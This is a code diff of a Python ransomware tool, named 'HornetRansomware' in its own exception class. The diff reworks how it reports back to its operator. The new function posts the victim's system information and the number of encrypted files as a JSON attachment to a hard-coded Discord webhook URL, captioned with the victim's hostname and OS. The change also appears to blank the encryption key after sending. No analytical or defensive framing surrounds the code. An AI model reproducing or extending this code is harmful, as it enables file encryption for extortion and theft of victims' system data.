@@ -12,40 +12,48 @@ import json
 # For rich and detailed error or information messages
 console = Console()
 
-def send_data(data: Union[Dict, str]) -> bool:
+def send_to_discord_with_file(message: str, data: Union[str, Dict]) -> bool:
     """
-    Send data to the server(Discord) and check if it succeeded.
+    Send a message with a JSON file attachment to Discord via a webhook.
 
-    :param data: The data to send.
-    :return: True if the data was sent successfully, False otherwise.
+    :param message: The message to send as a caption.
+    :param data: The data to include as a file attachment (JSON or string).
+    :return: True if the message and file were sent successfully, False otherwise.
     """
     webhook_url = "https://discord.com/api/webhooks/1313875651220082710/RV3tyN3A4h6sxxepIYgc8FoyXc3dROpZJQGYtXlDdZqytgT8hcpnYLBf4RqoKdLMOvym"
 
+    # If the data is a dictionary, convert it to JSON string
     if isinstance(data, Dict):
-        # If the data is a Python dictionary, then stringify with 2 spaces per indentation
         data = json.dumps(data, indent=4)
 
-    # Wrap by the code block (for better readability in Discord)
-    data = f"```json\n{data}\n```"
+    # Create the file attachment
+    filename = "data.json"
+    files = {
+        "file": (filename, data)
+    }
 
+    # Payload for the message content
     payload = {
-        "content": data
+        "content": message
     }
 
     try:
-        response = requests.post(webhook_url, json=payload)
-        if response.status_code != 204:
+        # Send the message with file attachment
+        response = requests.post(webhook_url, data=payload, files=files)
+        if response.status_code != 200:
             raise HornetRansomwareException(
-                message = "Failed to send data to the server.",
-                context = {
+                message="Failed to send message and file to the server.",
+                context={
                     "status_code": response.status_code,
                     "response": response.text
                 }
             )
         return True
-    except HornetRansomwareException as _:
+    except HornetRansomwareException as exc:
+        print(f"Error: {exc.message}")
+        if exc.context:
+            print(f"Context: {exc.context}")
         return False
-
 
 def encrypt_file(filepath: str, key: bytes) -> None:
     """
@@ -168,8 +176,13 @@ if __name__ == "__main__":
         "number_of_files_encrypted": number_of_files_encrypted,
         "system_information": collect_system_information()
     }
+    message = f"{data['system_information']['os_info']['node_name']}@{data['system_information']['os_info']['system']}"
 
-    if send_data(data):
-        console.log("Key sent successfully.")
+    if send_to_discord_with_file(message = message, data = data):
+        console.log(f"Data sent successfully, {len(str(message)) + len(str(data))} bytes.")
     else:
-        console.log("Failed to send key.")
+        console.log("Failed to send the data.")
+
+    # :p
+    key = "nothing"
+    key_hex = "0xnothing"
